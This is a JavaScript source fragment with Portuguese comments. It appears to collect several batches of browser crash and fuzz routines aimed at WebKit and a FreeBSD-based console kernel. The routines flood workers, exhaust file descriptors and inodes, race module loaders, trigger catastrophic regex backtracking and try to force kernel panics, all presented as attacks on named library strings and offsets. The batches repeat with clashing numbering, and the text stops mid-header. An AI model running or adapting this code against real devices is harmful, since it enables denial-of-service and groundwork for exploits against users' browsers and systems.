            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            let i = 0;
            const interval = setInterval(() => {
                const sw = new SharedWorker(url, "race_" + i);
                sw.port.start();
                sw.port.postMessage("ping");
                
                // O WebKit não tem sw.terminate(), mas podemos garbage collect a referência
                // ou navegar o iframe que o contém. Aqui simulamos carga rápida.
                
                // Força atividade no proxy
                sw.port.postMessage({buffer: new ArrayBuffer(1024)});
                
                i++;
                if(i % 100 === 0) log(`Workers Proxy Ciclados: ${i}`);
                if(i > 1000) clearInterval(interval);
            }, 10);
        }

        // --- TESTE 2: /system_tmp/ Overflow Trigger ---
        // Alvo: O caminho "/system_tmp/" encontrado no binário.
        // Tenta encher o disco temporário usando CacheStorage e Blobs.
        function runSysTmpFlood() {
            log("[WebKit] Inundando /system_tmp/...");
            
            if (!window.caches) return log("Cache API off.");
            
            // Cria um payload grande (10MB)
            const data = new Response(new ArrayBuffer(10 * 1024 * 1024));
            let count = 0;
            
            caches.open('sys_tmp_killer').then(cache => {
                const interval = setInterval(() => {
                    // Grava ficheiros rapidamente. O sistema deve fazer flush para o disco (/system_tmp/)
                    // quando a RAM encher.
                    cache.put('/file_' + count, data.clone())
                        .catch(e => log("Quota error (Bom): " + e.name));
                    
                    count++;
                    if(count % 10 === 0) log(`Arquivos 10MB escritos: ${count}`);
                    
                    // Não paramos até erro de quota ou crash
                }, 50);
            });
        }

        // --- TESTE 3: WTF::AutomaticThread Starvation ---
        // Alvo: "WTF::AutomaticThread" (Pool de threads internas do WebKit).
        // Tenta ocupar todas as threads auxiliares para impedir tarefas do sistema.
        function runAutoThreadStress() {
            log("[WebKit] Esgotando AutomaticThreads...");
            
            const p = [];
            // ImageBitmap decode usa AutomaticThreads
            const blob = new Blob([""], {type: "image/png"}); 
            
            for(let i=0; i<5000; i++) {
                // Dispara milhares de tarefas em paralelo
                p.push(createImageBitmap(blob).catch(()=>{}));
            }
            
            // Crypto também usa
            if(window.crypto && window.crypto.subtle) {
                for(let i=0; i<1000; i++) {
                    p.push(crypto.subtle.digest("SHA-256", new Uint8Array(100)).catch(()=>{}));
                }
            }
            
            log("5000+ Tarefas de thread agendadas.");
        }

        // --- TESTE 4: int_thread_get Interrupt Storm ---
        // Alvo: "int_thread_get" (Gestão de interrupções).
        // Gera 'soft interrupts' massivos via Timers e PostMessage.
        function runInterruptStorm() {
            log("[KERNEL] Iniciando Interrupt Storm...");
            
            const mc = new MessageChannel();
            mc.port1.onmessage = () => {}; // Drain
            
            // Loop síncrono que dispara eventos assíncronos
            // Isso força o kernel a agendar e despachar interrupções de software
            const workerCode = `
                setInterval(() => {
                    // Timer de alta frequência
                }, 0);
                onmessage = (e) => {
                    e.data.postMessage("irq");
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            for(let i=0; i<20; i++) {
                const w = new Worker(url);
                // Ping-pong furioso
                setInterval(() => w.postMessage(mc.port2, [mc.port2]), 1);
            }
            log("Tempestade de IRQ iniciada.");
        }

        // --- TESTE 5: vm.budgets.mlock_avail Underflow ---
        // Alvo: "vm.budgets.mlock_avail"
        // Tenta confundir o contador de memória disponível alocando e libertando Wasm.
        function runMlockUnderflow() {
            log("[KERNEL] Atacando mlock_avail Counter...");
            
            if (!window.WebAssembly) return log("Wasm off.");
            
            const mems = [];
            let state = 0;
            
            const interval = setInterval(() => {
                try {
                    // Padrão de serra: Aloca muito, liberta tudo, repete
                    // Tenta criar uma condição onde o contador 'avail' dessincroniza
                    if (state === 0) {
                        // Aloca
                        for(let i=0; i<10; i++) {
                            mems.push(new WebAssembly.Memory({initial: 100, shared: true}));
                        }
                        if (mems.length > 200) state = 1;
                    } else {
                        // Liberta (Drop references)
                        mems.length = 0; // Trigger GC
                        state = 0;
                    }
                } catch(e) {
                    // Ignora erros de OOM, queremos o erro de lógica no contador
                }
            }, 10);
            
            // Força GC periódico para efetivar a libertação no Kernel
            setInterval(() => {
                const trash = new ArrayBuffer(10 * 1024 * 1024);
            }, 1000);
            
            log("Mlock Fluctuation ativa.");
        }

        // --- TESTE 6: thr_init.c Allocation Failure ---
        // Alvo: "Can't allocate initial thread" (thr_init.c)
        // Tenta falhar a inicialização da thread no nível mais baixo.
        function runInitThreadFail() {
            log("[KERNEL] Forçando falha em thr_init...");
            
            const workerCode = `postMessage('ok');`;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // Spam de criação de Workers.
            // Diferente de outros testes, aqui queremos falhar a *criação* da estrutura, não o uso.
            let count = 0;
            function spam() {
                for(let i=0; i<50; i++) {
                    new Worker(url).terminate(); // Cria e mata instantaneamente
                }
                count += 50;
                if(count % 1000 === 0) log(`Tentativas init: ${count}`);
                if(count < 50000) setTimeout(spam, 0);
                else log("Fim do teste Init.");
            }
            spam();
        }
// --- TESTE 1: Dinkum C++ Thread Resource Error ---
        // Alvo: Exceção C++ específica da lib Dinkumware ("thread_resource_error").
        // Tenta esgotar recursos de thread dentro de um contexto que não trata a exceção corretamente.
        function runDinkumCrash() {
            log("[WebKit] Triggering Dinkum Thread Error...");
            
            // AudioWorklet corre numa thread separada e cria threads internas para processamento
            if (!window.AudioContext) return log("WebAudio off.");
            
            const ctxs = [];
            
            const interval = setInterval(() => {
                try {
                    // Cria contextos rapidamente. Cada um aloca threads de áudio.
                    // O limite de threads C++ é menor que o limite de Workers JS.
                    const ctx = new AudioContext();
                    // Cria osciladores para forçar atividade na thread
                    const osc = ctx.createOscillator();
                    osc.start();
                    ctxs.push(ctx);
                    
                    if (ctxs.length % 10 === 0) log(`Contextos Áudio: ${ctxs.length}`);
                } catch(e) {
                    log("Erro JS capturado: " + e.message);
                    clearInterval(interval);
                    // Se a exceção for nativa (C++), o browser fecha antes de chegar aqui.
                }
            }, 10);
        }

        // --- TESTE 2: Sysmodule Loader Race ---
        // Alvo: /system/common/lib/libSceSysmodule.sprx
        // Tenta criar uma race condition no carregador de bibliotecas dinâmicas do sistema.
        function runSysmoduleRace() {
            log("[WebKit] Atacando Sysmodule Loader...");
            
            // APIs que carregam módulos sob demanda:
            // 1. WebGL (GnmDriver)
            // 2. WebAudio (AudioOut)
            // 3. Fonts (Freetype)
            
            let i = 0;
            const interval = setInterval(() => {
                // Alterna entre criar Canvas e AudioContext para forçar load/unload de módulos
                if (i % 2 === 0) {
                    const c = document.createElement('canvas');
                    const gl = c.getContext('webgl');
                    // Perde referência imediatamente
                } else {
                    const ac = new AudioContext();
                    ac.close();
                }
                
                i++;
                if (i % 100 === 0) log(`Ciclos de Load: ${i}`);
                if (i > 2000) {
                    clearInterval(interval);
                    log("Teste Sysmodule finalizado.");
                }
            }, 5);
        }

        // --- TESTE 3: System Console Logging Enable Race ---
        // Alvo: "Enable logging page messages to system console"
        // Tenta ativar/desativar logs de sistema concorrentemente.
        function runConsoleEnableRace() {
            log("[WebKit] Racing Console Enable Flag...");
            
            const workerCode = `
                onmessage = () => {
                    // Spamma logs para testar se a flag 'Enable' é atómica
                    setInterval(() => {
                        console.log("RACE_LOG_CHECK");
                        console.time("timer"); // Inicia timer
                        console.timeEnd("timer"); // Para timer (Internal state change)
                    }, 0);
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            for(let i=0; i<10; i++) new Worker(url).postMessage("go");
            log("Workers spammando logs e timers.");
        }

        // --- TESTE 4: kmem_map Allocation Fragmentation ---
        // Alvo: "Current kmem_map allocation size"
        // Tenta fragmentar o mapa de memória do Kernel para falhar novas alocações.
        function runKmemFrag() {
            log("[KERNEL] Fragmentando kmem_map...");
            
            const allocations = [];
            
            const interval = setInterval(() => {
                // Aloca objetos que usam memória do Kernel (não apenas Userland Heap)
                
                // 1. SharedArrayBuffer (VM Map entries) - Tamanho médio
                try {
                    const sab = new SharedArrayBuffer(64 * 1024);
                    allocations.push({type: 'sab', obj: sab});
                } catch(e){}
                
                // 2. MessageChannel (File Descriptors + Kernel Buffers) - Tamanho pequeno
                try {
                    const mc = new MessageChannel();
                    // Envia dados para alocar buffer no kernel
                    mc.port1.postMessage(new ArrayBuffer(1024)); 
                    allocations.push({type: 'mc', obj: mc});
                } catch(e){}
                
                // 3. Deleta aleatoriamente para criar "buracos" no mapa (Fragmentação)
                if (allocations.length > 1000) {
                    const idx = Math.floor(Math.random() * allocations.length);
                    // Para MessageChannel, fechar portas liberta recurso
                    if (allocations[idx].type === 'mc') {
                        allocations[idx].obj.port1.close();
                    }
                    allocations.splice(idx, 1);
                }
                
                if (allocations.length % 500 === 0) log(`Objetos Kernel Ativos: ${allocations.length}`);
                
            }, 5);
        }

        // --- TESTE 5: Initial Thread Alloc Fail ---
        // Alvo: "Can't allocate initial thread"
        // Tenta falhar a criação da estrutura da primeira thread de um processo (Worker).
        function runInitThreadFail() {
            log("[KERNEL] Atacando thr_new (Initial)...");
            
            const workerCode = `postMessage('ok');`;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // A ideia é criar workers tão rápido que o kernel falhe em alocar a struct 'kthread'
            // antes mesmo de iniciar o JavaScriptCore.
            let count = 0;
            const batchSize = 50;
            
            function blast() {
                for(let i=0; i<batchSize; i++) {
                    const w = new Worker(url);
                    w.terminate(); // Mata imediatamente para stressar alocador/desalocador
                }
                count += batchSize;
                if (count % 1000 === 0) log(`Threads Init Stress: ${count}`);
                
                if (count < 20000) requestAnimationFrame(blast);
                else log("Fim do teste Init.");
            }
            blast();
        }

        // --- TESTE 6: Read-Only Filesystem Panic ---
        // Alvo: "read only file system"
        // Tenta escrever em áreas que podem ficar Read-Only sob stress (como /system_tmp se cheio).
        function runEROFS() {
            log("[KERNEL] Triggering EROFS Panic...");
            
            if (!window.webkitRequestFileSystem) return log("FS API off.");
            
            window.webkitRequestFileSystem(window.TEMPORARY, 1024*1024*50, (fs) => {
                function write(i) {
                    fs.root.getFile('crash_' + i, {create: true}, (entry) => {
                        entry.createWriter((writer) => {
                            const blob = new Blob(["A".repeat(1024*1024)]); // 1MB
                            writer.write(blob);
                            writer.onwriteend = () => {
                                // Deleta imediatamente para causar churn
                                entry.remove(() => {});
                            };
                            writer.onerror = (e) => {
                                // Se der erro de IO ou ReadOnly, loga
                                log("FS Error: " + e.toString());
                            };
                        });
                    });
                }
                
                // Flood de I/O
                for(let i=0; i<500; i++) write(i);
                log("I/O Flood iniciado no FS Temporário.");
            }, (e) => log("FS Init Error: " + e.message));
        }
// --- TESTE 1: SharedWorker ID Wraparound ---
        // Alvo: WTF::ObjectIdentifierGeneric<WebCore::SharedWorkerObjectIdentifierType...>
        // Tenta gerar IDs suficientes para causar colisão ou overflow no contador interno.
        function runIDWrap() {
            log("[WebKit] Iniciando ID Wraparound...");
            
            const blob = new Blob([""], {type: "text/javascript"});
            const url = URL.createObjectURL(blob);
            
            let count = 0;
            const interval = setInterval(() => {
                // Cria e "esquece" workers rapidamente
                // O WebKit incrementa um contador estático para cada novo Worker
                // Se for um uint32, demora, mas se for uint16 ou tabela hash, colide rápido.
                for(let i=0; i<50; i++) {
                    new SharedWorker(url, "id_" + count + "_" + i);
                }
                
                count += 50;
                if(count % 1000 === 0) log(`IDs gerados: ${count}`);
                
                // Em um exploit real, tentaríamos reutilizar um ID antigo
            }, 10);
        }

        // --- TESTE 2: /dev/null IO Confusion ---
        // Alvo: "/dev/null" encontrado na Libc.
        // Tenta forçar o navegador a interagir com devices especiais.
        function runDevNull() {
            log("[WebKit] Testando /dev/null IO...");
            
            try {
                // Tenta fetch em caminhos de sistema (muitas vezes bloqueado, mas a string existe no binário)
                // Se o WebKit passar o caminho "nu" para a syscall open...
                
                // 1. Tenta carregar script
                const s = document.createElement('script');
                s.src = "file:///dev/null"; 
                document.body.appendChild(s);
                
                // 2. Tenta XHR
                const xhr = new XMLHttpRequest();
                xhr.open("GET", "/dev/null"); // Relativo ou absoluto
                xhr.send();
                
                log("Requisições enviadas para Null Device.");
            } catch(e) {
                log("Erro IO: " + e.message);
            }
        }

        // --- TESTE 3: gets_s Bad Argument Trigger ---
        // Alvo: "gets_s: bad argument" (Libc)
        // gets_s falha se o buffer for NULL ou o tamanho > RSIZE_MAX.
        function runGetsBadArg() {
            log("[WebKit] Atacando gets_s (Bad Arg)...");
            
            // FileReader usa buffers internos. Tentar ler um Blob gigante pode
            // resultar num pedido de alocação que falha (NULL) mas é passado para leitura.
            try {
                const huge = new Blob(["A".repeat(1024*1024*100)]); // 100MB
                const reader = new FileReader();
                
                // Tenta ler como ArrayBuffer e abortar/ler texto simultaneamente
                reader.readAsText(huge);
                
                // Força estado inválido
                reader.abort();
                reader.readAsArrayBuffer(huge); // Reuso imediato
                
                log("FileReader stress iniciado.");
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 4: Console Device Open Panic ---
        // Alvo: "Can't open console" (Libkernel)
        // Cria uma condição onde o Kernel *precisa* logar um erro, mas não consegue abrir o console.
        function runConsolePanic() {
            log("[KERNEL] Forçando Console Open Panic...");
            
            // 1. Esgota File Descriptors (FDs)
            const fds = [];
            const interval = setInterval(() => {
                try {
                    fds.push(new MessageChannel());
                } catch(e) {
                    clearInterval(interval);
                    log("FDs esgotados. Forçando erro de sistema...");
                    triggerSystemError();
                }
            }, 1);
            
            function triggerSystemError() {
                // 2. Com FDs esgotados, gera um erro que o Kernel normalmente logaria no /dev/console
                // Ex: Acesso inválido a recurso de thread ou socket
                try {
                    const ws = new WebSocket("ws://127.0.0.1"); // Falha ao criar socket (Sem FD)
                    // O Kernel tenta reportar a falha, tenta abrir /dev/console, falha (Sem FD) -> Panic path?
                } catch(x) {}
                
                // Spam de console.error também força flush para stderr/console
                for(let i=0; i<1000; i++) console.error("PANIC_TRIGGER");
            }
        }

        // --- TESTE 5: Global Resource Exhaustion ---
        // Alvo: "cannot allocate resource." (Kernel genérico)
        // Usa BroadcastChannel que consome recursos IPC globais (System-wide).
        function runResourceSpray() {
            log("[KERNEL] Spray de Recursos Globais...");
            
            const channels = [];
            let count = 0;
            
            const interval = setInterval(() => {
                try {
                    // BroadcastChannel muitas vezes usa recursos mais pesados que MessageChannel
                    // pois precisa registar nomes globais no sistema.
                    const bc = new BroadcastChannel("spray_" + count);
                    channels.push(bc);
                    count++;
                    
                    if (count % 100 === 0) log(`Canais Globais: ${count}`);
                } catch(e) {
                    log("Limite Global Atingido: " + e.message);
                    clearInterval(interval);
                }
            }, 5);
        }

        // --- TESTE 6: Interrupt Thread Starvation ---
        // Alvo: "int_thread_get" (Falha na thread de interrupção)
        // Usa OffscreenCanvas e Timers para gerar carga de interrupção.
        function runInterruptThread() {
            log("[KERNEL] Atacando Thread de Interrupção...");
            
            const workerCode = `
                onmessage = () => {
                    // Gera carga de timer (SoftIRQ)
                    setInterval(() => {}, 1);
                    
                    // Gera carga de GPU (Hardware IRQ)
                    try {
                        const c = new OffscreenCanvas(10, 10);
                        const gl = c.getContext('webgl');
                        setInterval(() => {
                            gl.clear(gl.COLOR_BUFFER_BIT);
                            gl.finish(); // Força sync com IRQ
                        }, 0);
                    } catch(e) {}
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            for(let i=0; i<10; i++) new Worker(url).postMessage("start");
            log("Tempestade de IRQ (Timer + GPU) iniciada.");
        }
// --- TESTE 1: TextDecoder BOM Confusion ---
        // Alvo: Parsing de strings na Libc.
        // O Byte Order Mark (BOM) define se é Big Endian ou Little Endian.
        // Injetar múltiplos BOMs conflitantes pode confundir o ponteiro de leitura.
        function runBOMConfusion() {
            log("[WebKit] Iniciando BOM Confusion...");
            
            try {
                // UTF-16 LE BOM: 0xFF 0xFE
                // UTF-16 BE BOM: 0xFE 0xFF
                const buffer = new Uint8Array(1024);
                
                // Preenche com BOMs alternados conflitantes
                for(let i=0; i<buffer.length; i+=2) {
                    if (i % 4 === 0) { buffer[i]=0xFF; buffer[i+1]=0xFE; }
                    else { buffer[i]=0xFE; buffer[i+1]=0xFF; }
                }
                
                const dec = new TextDecoder("utf-16");
                log("Decodificando stream de BOMs conflitantes...");
                
                // O descodificador tenta ajustar o endianness a cada BOM?
                // Se falhar, pode ler desalinhado.
                const str = dec.decode(buffer);
                
                log("Decode feito (Seguro).");
            } catch(e) {
                log("Erro Encoding: " + e.message);
            }
        }

        // --- TESTE 2: FontFace Set Loading Race ---
        // Alvo: Carregador de Módulos de Fonte (Freetype / Sysmodule).
        function runFontLoadRace() {
            log("[WebKit] Iniciando Font Loading Race...");
            
            // Cria muitas fontes baseadas em Blobs
            const fonts = [];
            for(let i=0; i<100; i++) {
                const f = new FontFace('CrashFont'+i, 'url(data:font/woff;base64,AAAA)');
                fonts.push(f);
            }
            
            // Adiciona e remove massivamente do documento
            const interval = setInterval(() => {
                fonts.forEach(f => {
                    document.fonts.add(f);
                    f.load().catch(()=>{}); // Dispara thread de load
                    document.fonts.delete(f); // Remove imediatamente
                });
                
                if (Math.random() > 0.9) {
                    clearInterval(interval);
                    log("Race de fontes finalizada.");
                }
            }, 10);
        }

        // --- TESTE 3: FinalizationRegistry Object Resurrection ---
        // Alvo: Garbage Collector (JSC).
        // Tenta ressuscitar um objeto que está a ser destruído.
        function runGCResurrection() {
            log("[WebKit] Tentando Ressurreição de Objetos...");
            
            if (!window.FinalizationRegistry) return log("API não suportada.");
            
            let graveyard = [];
            const registry = new FinalizationRegistry((heldValue) => {
                // O objeto morreu. O callback roda.
                // Tenta criar uma nova referência forte para algo relacionado
                // Isso é "Ressurreição Lógica" e estressa o GC
                log("Objeto morreu: " + heldValue);
                graveyard.push({ id: heldValue, data: new Array(1000).fill(1) });
            });
            
            // Cria lixo
            for(let i=0; i<1000; i++) {
                let obj = {id: i};
                registry.register(obj, i);
                obj = null; // Solta referência
            }
            
            // Força GC
            setTimeout(() => {
                const junk = new ArrayBuffer(50 * 1024 * 1024);
                log("GC forçado. Verifique se o registro disparou.");
            }, 500);
        }

        // --- TESTE 4: Sysctl Info Leak Stress ---
        // Alvo: "machdep.system_ex_version" (Sysctl access).
        // A leitura de propriedades como navigator.hardwareConcurrency ou userAgent
        // muitas vezes mapeia para chamadas sysctl no FreeBSD.
        function runSysctlSpam() {
            log("[KERNEL] Spammando leituras de sistema...");
            
            const workerCode = `
                onmessage = () => {
                    let total = 0;
                    // Loop apertado de leitura de propriedades do sistema
                    // Tenta criar contenção no lock de leitura do Kernel
                    while(true) {
                        total += navigator.hardwareConcurrency;
                        total += navigator.maxTouchPoints;
                        // Acesso a userAgent pode envolver string copy no kernel
                        const ua = navigator.userAgent;
                    }
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            for(let i=0; i<10; i++) new Worker(url).postMessage("start");
            log("10 Workers lendo Sysctl info.");
        }

        // --- TESTE 5: Socket Buffer Full Window Deadlock ---
        // Alvo: Gestão de buffers de rede (mbuf).
        function runSocketFullWindow() {
            log("[KERNEL] Criando Socket Window Deadlock...");
            
            // Abre WebSocket e NÃO lê dados
            const ws = new WebSocket("wss://echo.websocket.org");
            
            ws.onopen = () => {
                // Envia dados para o echo server
                // O servidor vai devolver tudo.
                // Nós NÃO definimos onmessage, logo o buffer de entrada do Kernel enche.
                // O Kernel deve enviar "TCP Window Full" para o servidor.
                // Testamos se o Kernel aguenta milhares de bytes pendentes sem crashar.
                
                const data = new Uint8Array(1024 * 1024).fill(65); // 1MB
                
                let sent = 0;
                const interval = setInterval(() => {
                    if (ws.bufferedAmount < 5 * 1024 * 1024) {
                        ws.send(data);
                        sent++;
                        if (sent % 10 === 0) log(`Enviado para Echo: ${sent}MB (Sem ler volta)`);
                    }
                }, 100);
                
                setTimeout(() => {
                    clearInterval(interval);
                    ws.close();
                    log("Teste Window Deadlock finalizado.");
                }, 10000);
            };
        }

        // --- TESTE 6: TLS DTV Block Dealloc Corruption ---
        // Alvo: "deallocate_tls_block_from_dtv" (Libkernel Offset 0x3E9B1)
        // DTV = Dynamic Thread Vector. Gere variáveis locais de thread.
        function runTLSDTVCorruption() {
            log("[KERNEL] Corrompendo DTV (TLS Dealloc)...");
            
            const workerCode = `
                onmessage = () => {
                    // 1. Aloca TLS massivo usando Intl (usa icu data per thread)
                    const formatters = [];
                    for(let i=0; i<200; i++) {
                        formatters.push(new Intl.NumberFormat('ar-EG'));
                    }
                    
                    // 2. Termina imediatamente para forçar o Kernel a limpar o DTV
                    // Se houver race, o ponteiro DTV pode ser libertado duas vezes
                    close();
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // Cria e mata workers freneticamente
            let count = 0;
            const interval = setInterval(() => {
                for(let i=0; i<20; i++) new Worker(url).postMessage("go");
                count += 20;
                if (count % 500 === 0) log(`Threads TLS destruídas: ${count}`);
                
                if (count > 10000) {
                    clearInterval(interval);
                    log("DTV Corruption Test finalizado.");
                }
            }, 20);
        }
// --- TESTE 1: sprintf_s Bad Format Argument ---
        // Alvo: "sprintf_s: bad format argument"
        // Ataca as funções de console que usam formatação complexa.
        function runFormatAttack() {
            log("[WebKit] Atacando Console Formatter...");
            
            // Cria um objeto circular com toString recursivo
            const recursive = {
                id: 1,
                toString: function() { return this; } // Retorna a si mesmo (Erro de tipo no sprintf?)
            };
            recursive.ref = recursive;
            
            try {
                // console.group usa formatação para o título do grupo
                // console.table formata tabelas complexas
                // Tentamos passar argumentos que a libc não espera
                console.group("CrashGroup %s %o", recursive, recursive);
                console.table([recursive, recursive]);
                console.groupEnd();
                
                log("Formatadores executados (Seguro).");
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 2: WTF::AutomaticThread Starvation ---
        // Alvo: "WTF::AutomaticThread" (Pool de threads internas)
        // Se ocuparmos todas, outras funções do sistema (como timers ou rede) podem falhar.
        function runThreadStarve() {
            log("[WebKit] Esgotando Thread Pool...");
            
            if (!window.crypto || !window.createImageBitmap) return log("APIs off.");
            
            const p = [];
            const blob = new Blob([""], {type: "image/png"});
            
            // Dispara milhares de tarefas pequenas para fragmentar o agendamento
            for(let i=0; i<2000; i++) {
                // Crypto usa threads de background
                p.push(crypto.subtle.digest("SHA-1", new Uint8Array(10)).catch(()=>{}));
                // Image Decode usa threads de background
                p.push(createImageBitmap(blob).catch(()=>{}));
            }
            
            Promise.all(p).then(() => log("Pool recuperada."));
            log("Pool inundada.");
        }

        // --- TESTE 3: Scroll Momentum Logic Fuzzing ---
        // Alvo: "Generate momentum events in WebKit"
        // Conflito entre scroll suave (physics) e scroll forçado (layout).
        function runMomentumFuzz() {
            log("[WebKit] Fuzzing Scroll Physics...");
            const div = document.getElementById('scroll-dummy');
            
            let i = 0;
            const interval = setInterval(() => {
                // 1. Inicia scroll suave (Ativa momentum engine)
                div.scrollTo({top: 500, behavior: 'smooth'});
                
                // 2. Interrompe imediatamente com mutação de layout
                if (i % 2 === 0) {
                    div.style.height = (100 + i) + "px"; // Reflow
                    div.scrollTop = 0; // Hard reset
                }
                
                // 3. Dispara evento sintético conflitante
                div.dispatchEvent(new WheelEvent('wheel', {deltaY: -500}));
                
                i++;
                if (i > 200) {
                    clearInterval(interval);
                    log("Momentum Fuzz finalizado.");
                }
            }, 10);
        }

        // --- TESTE 4: vm.budgets.mlock Underflow Attempt ---
        // Alvo: "vm.budgets.mlock_avail"
        // Tenta confundir a contabilidade de memória "wired".
        function runMlockLogic() {
            log("[KERNEL] Testando Mlock Budget Logic...");
            
            if (!window.WebAssembly) return log("Wasm off.");
            
            const memories = [];
            
            // Aloca e liberta em padrões estranhos para tentar desincronizar o contador
            const interval = setInterval(() => {
                try {
                    // Aloca memória partilhada (usa mlock)
                    const m = new WebAssembly.Memory({initial: 10, shared: true});
                    memories.push(m);
                    
                    // Cresce (altera o budget)
                    m.grow(5);
                    
                    // Se tivermos muitos, liberta metade aleatoriamente
                    if (memories.length > 50) {
                        // Remove do meio do array (fragmentação lógica)
                        memories.splice(Math.floor(Math.random() * memories.length), 1);
                    }
                } catch(e) {
                    // Se falhar a alocação, tenta forçar limpeza total
                    memories.length = 0;
                }
            }, 5);
            
            setTimeout(() => {
                clearInterval(interval);
                log("Mlock Test finalizado.");
            }, 5000);
        }

        // --- TESTE 5: Stack Red Zone Bypass (Thr Init) ---
        // Alvo: "Cannot allocate red zone for initial thread"
        // Cria threads que usam muita stack imediatamente, competindo com a inicialização.
        function runRedZoneBypass() {
            log("[KERNEL] Bypass Red Zone...");
            
            const workerCode = `
                function deep(n) {
                    const v = new Float64Array(128); // Usa stack
                    if (n > 0) deep(n-1);
                }
                // Assim que nasce, consome stack
                deep(500); 
                postMessage("Done");
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // Spawn flood
            let count = 0;
            const interval = setInterval(() => {
                for(let i=0; i<20; i++) {
                    new Worker(url).onmessage = () => {};
                }
                count += 20;
                if(count > 2000) {
                    clearInterval(interval);
                    log("Red Zone Stress finalizado.");
                }
            }, 10);
        }

        // --- TESTE 6: 'Can't open console' Panic Trigger ---
        // Alvo: "Can't open console" (Libkernel)
        // Esgota FDs e força um erro de sistema que EXIGE log.
        function runConsolePanic() {
            log("[KERNEL] Triggering Console Panic...");
            
            const fds = [];
            
            // 1. Esgota File Descriptors (FDs)
            function fillFDs() {
                try {
                    while(true) fds.push(new MessageChannel());
                } catch(e) {
                    log("FDs esgotados (" + fds.length * 2 + ").");
                    triggerPanic();
                }
            }
            
            function triggerPanic() {
                // 2. Agora que não há FDs, causamos um erro que o Kernel queira logar
                log("Forçando System Error sem FDs...");
                
                // Tenta criar socket (deve falhar por falta de FD)
                try { new WebSocket("ws://0.0.0.0"); } catch(x){}
                
                // Tenta criar Worker (deve falhar)
                try { new Worker(""); } catch(x){}
                
                // Spam de console.error (tenta abrir /dev/console para stderr)
                // Se o Kernel não conseguir abrir /dev/console para reportar o erro crítico dos workers,
                // ele pode entrar em pânico.
                for(let i=0; i<100; i++) console.error("PANIC_ATTEMPT_" + i);
                
                setTimeout(() => {
                    // Liberta para não travar o browser para sempre se não der panic
                    fds.length = 0; 
                    log("Recursos libertados.");
                }, 2000);
            }
            
            setTimeout(fillFDs, 100);
        }
// --- TESTE 1: CSS Grid Memory Explosion ---
        // Alvo: JSC::CompleteSubspace::allocateSlow
        // O cálculo de Grid CSS cria matrizes gigantes na memória se definirmos muitas faixas.
        function runGridExplosion() {
            log("[WebKit] Iniciando Grid Memory Explosion...");
            const box = document.getElementById('grid-box');
            box.style.display = 'grid';
            box.innerHTML = "";
            
            // Define 5000x5000 linhas/colunas
            // O motor tenta alocar uma matriz para gerir as interseções
            // 5000 * 5000 = 25.000.000 células virtuais
            try {
                box.style.gridTemplateColumns = "repeat(5000, 1px)";
                box.style.gridTemplateRows = "repeat(5000, 1px)";
                
                // Coloca um item que atravessa tudo para forçar o cálculo
                const item = document.createElement('div');
                item.style.gridColumn = "1 / -1";
                item.style.gridRow = "1 / -1";
                item.style.backgroundColor = "red";
                box.appendChild(item);
                
                log("Grid definido. Forçando layout...");
                // A leitura força o cálculo síncrono
                const h = box.offsetHeight;
                
                log("Layout Engine sobreviveu.");
                box.style.display = 'none';
            } catch(e) {
                log("Erro Grid: " + e.message);
            }
        }

        // --- TESTE 2: SharedWorker Proxy Message Loop ---
        // Alvo: SharedWorkerThreadProxy.cpp
        // Cria um loop de mensagens intenso para estressar o proxy C++.
        function runProxyLoop() {
            log("[WebKit] Estressando SharedWorker Proxy...");
            
            const workerCode = `
                onmessage = (e) => {
                    // Ecoa imediatamente
                    postMessage(e.data);
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            const sw = new SharedWorker(url);
            sw.port.start();
            
            let count = 0;
            const payload = { data: new Array(1000).fill(1.1) }; // Payload serializável complexo
            
            sw.port.onmessage = () => {
                count++;
                if (count % 1000 === 0) log(`Msgs Proxy: ${count}`);
                if (count < 10000) sw.port.postMessage(payload);
                else log("Proxy Test finalizado.");
            };
            
            // Inicia o ping-pong
            sw.port.postMessage(payload);
        }

        // --- TESTE 3: RegExp Sticky Buffer Overflow ---
        // Alvo: Motor Regex JSC (YARR)
        // Usa a flag 'y' (sticky) com padrões repetitivos para estourar o buffer de backtracking.
        function runRegexSticky() {
            log("[WebKit] Iniciando Regex Sticky Overflow...");
            
            try {
                // Padrão que causa backtracking catastrófico ou consumo alto de stack
                // (a+)+
                const pattern = "(a+)+";
                const re = new RegExp(pattern, "y");
                
                const str = "a".repeat(10000) + "b"; // Falha no final
                
                log("Executando Regex...");
                re.lastIndex = 0;
                re.exec(str);
                
                log("Regex Engine sobreviveu.");
            } catch(e) {
                log("Erro Regex: " + e.message);
            }
        }

        // --- TESTE 4: /system_tmp/ Inode Exhaustion ---
        // Alvo: /system_tmp/ (Libkernel)
        // O sistema de ficheiros tem limite de Inodes (número de ficheiros), não só de espaço.
        function runInodeFlood() {
            log("[KERNEL] Esgotando Inodes em /system_tmp/...");
            
            if (!window.caches) return log("Cache API off.");
            
            const cacheName = "inode_killer_" + Math.random();
            const data = new Response("x"); // Ficheiro pequeno (ocupa 1 Inode)
            
            caches.open(cacheName).then(cache => {
                let count = 0;
                const interval = setInterval(() => {
                    // Tenta criar 100 ficheiros por ciclo
                    const promises = [];
                    for(let i=0; i<100; i++) {
                        promises.push(cache.put('/file_' + count + "_" + i, data.clone()));
                    }
                    
                    count += 100;
                    if(count % 1000 === 0) log(`Ficheiros criados: ${count}`);
                    
                    if(count > 50000) { // Tenta criar 50k ficheiros
                        clearInterval(interval);
                        // Limpeza (opcional, pode deixar o sistema "sujo" para teste)
                        // caches.delete(cacheName);
                        log("Inode Flood pausado.");
                    }
                }, 10);
            }).catch(e => log("FS Error: " + e.message));
        }

        // --- TESTE 5: Timer SoftIRQ Storm ---
